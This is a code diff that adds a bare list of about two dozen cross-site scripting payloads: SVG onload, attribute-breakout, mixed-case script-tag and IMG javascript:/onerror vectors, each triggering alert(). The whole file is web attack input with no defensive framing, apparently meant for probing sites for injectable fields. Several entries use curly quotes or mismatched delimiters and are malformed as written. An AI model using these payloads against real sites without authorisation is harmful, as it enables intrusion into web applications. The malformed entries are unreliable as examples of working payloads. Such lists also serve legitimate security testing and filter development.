@@ -1,0 +1,26 @@
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+<script>alert("XSSED:D:")</script>
+<ScRipT>alert("XSSE:D");</ScRipT>
+<script>alert("XSSED:D");</script>
+<script>alert(“XSSED”)</script>
+<script>alert(“XSSED”);</script>
+<script>alert(‘XSSED’)</script>
+“><script>alert(“XSSED”)</script>
+<script>alert(/XSSED”)</script>
+<script>alert(/XSSED/)</script>
+</script><script>alert("XSSED")</script>
+‘; alert("XSSED");
+‘)alert("XSSED");//
+<ScRiPt>alert("XSSED")</sCriPt>
+<IMG SRC=jAVasCrIPt:alert(‘XSSED’)>
+<IMG SRC=”javascript:alert(‘XSSED’);”>
+<IMG SRC=javascript:alert(&quot;XSSED&quot;)>
+<IMG SRC=javascript:alert(‘XSSED’)>
+<img src=xss onerror=alert("XSSED")>
+
